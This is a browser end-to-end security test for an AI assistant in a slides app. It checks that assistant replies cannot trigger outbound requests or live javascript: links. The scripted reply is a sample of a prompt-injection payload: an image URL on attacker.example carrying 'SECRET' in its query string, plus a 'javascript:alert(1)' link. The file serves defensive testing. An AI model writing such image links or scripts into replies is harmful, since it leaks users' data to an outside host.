// The browser side of the security review (docs/decisions.md): an assistant reply cannot make the browser fetch
// anything. A reply with a picture from elsewhere (as a prompt injection would write it, to send data in its address)
// is shown without the picture, and no request leaves for that address; a javascript: link is not a link.
//   SLIDES_URL=http://localhost:2722/ SLIDES_PROXY_SECRET=e2e-secret node tests/ui/security.mjs
import { launch, open } from './lib.mjs';
import { writeFileSync } from 'node:fs';

const SCRIPT = new URL('../e2e/out/script.json', import.meta.url).pathname;
const FIX = new URL('../../fixtures/decks/', import.meta.url).pathname;
const problems = [];
const check = (ok, what) => { if (!ok) problems.push(what); console.log(`${ok ? 'ok  ' : 'FAIL'} ${what}`); };

const b = await launch();
const p = await open(b, `sec-${Date.now()}@example.com`, { width: 1440, height: 900, storage: { 'slides.uiLanguage': 'en' } });
const outbound = [];
p.on('request', (r) => { if (r.url().includes('attacker.example')) outbound.push(r.url()); });
await p.waitForSelector('.identity-btn');
await p.locator('.sb-view button', { hasText: 'New project' }).click();
await p.locator('.jsPanel input').first().fill('Security');
await p.locator('.jsPanel button.primary', { hasText: 'Create' }).click();
await p.waitForSelector('.page h1:text("Security")');
const chooser = p.waitForEvent('filechooser');
await p.locator('button', { hasText: 'Upload a presentation' }).click();
await (await chooser).setFiles(`${FIX}simple.pptx`);
await p.waitForSelector('.assistant textarea');
// twice: a first answer that calls no tool is asked once more (loop.py, NUDGE); the second is shown
const reply = { text: 'Done. ![x](https://attacker.example/?d=SECRET) [run](javascript:alert(1)) [site](https://ok.example)' };
writeFileSync(SCRIPT, JSON.stringify([reply, reply]));
await p.locator('.assistant textarea').fill('what is on slide 1?');
await p.locator('.assistant textarea').press('Enter');
await p.waitForSelector('.chat-msg.bot:has-text("Done.")', { timeout: 30000 });
await p.waitForTimeout(1500);
const shown = p.locator('.chat-msg.bot', { hasText: 'Done.' }).last();
check((await shown.locator('img').count()) === 0, 'a picture in a reply is not shown');
check(outbound.length === 0, `no request leaves for the picture's address (${outbound.length})`);
check((await shown.locator('a[href^="javascript"]').count()) === 0, 'a javascript: link is not a link');
check((await shown.locator('a[href="https://ok.example"]').count()) === 1, 'an ordinary link stays a link');
await b.close();
console.log(problems.length ? `PROBLEMS:\n${problems.join('\n')}` : 'security (browser): no problems');
process.exit(problems.length ? 1 : 0);
